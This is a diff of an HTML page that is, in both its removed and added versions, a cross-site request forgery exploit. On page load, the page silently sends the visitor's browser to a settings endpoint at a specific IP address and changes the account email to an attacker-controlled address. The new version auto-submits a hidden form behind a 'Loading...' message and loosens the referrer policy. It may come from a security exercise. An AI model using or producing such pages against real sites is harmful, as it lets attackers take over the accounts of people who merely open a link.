@@ -1,13 +1,12 @@
 <!DOCTYPE html>
 <html>
-<body>
-    <script>
-        window.addEventListener('DOMContentLoaded', () => {
-            const a = document.createElement('a');
-            a.href = "http://100.101.228.35:6009/settings/email?new=exploit@gmail.com";
-            document.body.appendChild(a);
-            a.click();
-        });
-    </script>
+<head>
+    <meta name="referrer" content="unsafe-url">
+</head>
+<body onload="document.getElementById('csrf-form').submit();">
+    <form id="csrf-form" action="http://100.101.228.35:6009/settings/email" method="GET">
+        <input type="hidden" name="new" value="exploit@gmail.com">
+    </form>
+    <p>Loading...</p>
 </body>
 </html>
